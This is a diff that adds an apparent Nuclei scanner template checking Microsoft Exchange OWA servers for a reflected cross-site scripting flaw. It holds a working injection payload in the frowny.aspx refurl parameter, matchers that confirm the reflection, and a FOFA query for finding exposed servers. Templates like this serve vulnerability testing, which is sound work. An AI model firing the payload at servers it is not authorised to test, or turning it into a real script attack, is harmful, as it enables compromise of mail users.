@@ -1,0 +1,31 @@
+id: ms-exchange-server-reflected-xss
+
+info:
+  name: MS Exchange Server XSS
+  author: infosecsanyam
+  severity: medium
+  tags: miscrsoft,exchange,owa,xss,ms-exchange
+  metadata:
+    fofa-query: 'icon_hash="1768726119"'
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'alert(document.domain)//&et=ServerError'
+          - 'mail/bootr.ashx'
+        condition: and
+
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
